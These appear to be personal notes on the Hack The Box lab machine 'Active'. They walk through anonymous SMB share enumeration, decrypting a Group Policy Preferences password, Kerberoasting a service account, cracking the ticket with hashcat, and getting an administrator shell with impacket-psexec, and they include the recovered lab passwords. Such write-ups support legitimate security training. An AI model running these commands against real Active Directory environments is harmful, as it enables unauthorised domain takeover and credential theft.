# Take Away
# Metadata
- Looking at the `autorecon` result, it seems that `SMB` allows anonymous access.![[Pasted image 20240303205805.png]]
- Running `netexec smb 10.10.10.100 -u "" -p ""` can further confirm.![[Pasted image 20240303205905.png]]
	- Run `netexec smb 10.10.10.100 -u "" -p "" --shares` identify a readable share named `Replication`. Use `netexec smb 10.10.10.100 -u "" -p "" -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./smb` download all files down to local host.
- Under `Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups`, there is a GPP file which contains credential for `active.htb\SVC_TGS`.![[Pasted image 20240303210319.png]]
	- The password is encrypted with a known secret. Hence, run `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ` to obtain credential as
		- `active.htb\SVC_TGS`: GPPstillStandingStrong2k18
		- ![[Pasted image 20240303210726.png]]
- Run `netexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18` reveals that `SVC_TGS` is not a local administrator.
- Hence, we need to opt for `ASPRoasting` and `Kerberoasting`.
	- Run `impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile kerbr.hash` to identify  SPN `active/CIFS:445` under the Domain Administrator Account.![[Pasted image 20240303211015.png]]
	- Run `hashcat -m 13100 kerbr.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` to obtain the credential as
		- `active.htb\administrator`: Ticketmaster1968
		- ![[Pasted image 20240303211937.png]]
# Exploitation
- No User Access
# PrivEsc
- `impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100`